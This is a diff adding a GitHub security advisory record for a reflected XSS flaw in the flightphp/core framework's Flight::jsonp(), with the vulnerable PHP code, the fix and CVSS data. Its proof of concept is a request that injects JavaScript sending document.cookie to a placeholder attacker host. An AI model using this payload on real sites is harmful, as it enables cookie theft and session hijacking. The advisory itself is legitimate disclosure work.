@@ -1,0 +1,61 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-fcx8-ph5r-mxr4",
+  "modified": "2026-05-14T20:39:53Z",
+  "published": "2026-05-06T21:34:15Z",
+  "aliases": [
+    "CVE-2026-42548"
+  ],
+  "summary": "Flight has reflected XSS through an unvalidated JSONP callback in Flight::jsonp() ",
+  "details": "### Summary\n`Flight::jsonp()` concatenates the `?jsonp=` query parameter directly into an `application/javascript` response body without validating that the value is a legal JavaScript identifier. An attacker can inject arbitrary JavaScript that executes in the response origin, enabling reflected cross-site scripting.\n\n### Affected code\n`flight/Engine.php` (≈ lines 1000-1013):\n\n```php\n$callback = $this->request()->query[$param];\n$this->response()\n    ->status($code)\n    ->header('Content-Type', 'application/javascript; charset=' . $charset)\n    ->write($callback . '(' . $json . ');');\n```\n\nNo regex or identifier validation is performed before the callback is written.\n\n### Proof of concept\nGiven any route that calls `Flight::jsonp($data)`:\n\n```\nGET /api?jsonp=;window.xss=function(d){fetch('https://attacker.tld/c='+d)};xss(document.cookie);//\n```\n\nReproduced response (`Content-Type: application/javascript`):\n\n```\n;window.xss=function(d){fetch('https://attacker.tld/c='+d)};xss(document.cookie);//({\"ok\":true,\"msg\":\"hello\"});\n```\n\nWhen the vulnerable endpoint is loaded via `<script src=\"https://victim.tld/api?jsonp=…\">` on a page controlled by the attacker, the injected JavaScript executes in the `victim.tld` origin whenever that page is embedded or visited in a same-origin context — cookie theft and session hijack follow.\n\n### Impact\n- Reflected XSS in any application calling `Flight::jsonp()`.\n- Cookie theft / session hijack when JSONP endpoints are referenced from same-origin pages.\n- Exfiltration of authenticated API responses.\n\n### Patch (fixed in `3.18.1`, commit `b8dd23a`)\n`_jsonp()` now validates the callback name against `^[A-Za-z_$][\\w$.]{0,127}$` before emitting it. An empty callback (no `jsonp` parameter) still behaves as before.\n\n### Credit\nDiscovered by **@Rootingg**.",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "flightphp/core"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.18.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/flightphp/core/security/advisories/GHSA-fcx8-ph5r-mxr4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42548"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/flightphp/core"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-05-06T21:34:15Z",
+    "nvd_published_at": "2026-05-13T20:16:21Z"
+  }
+}
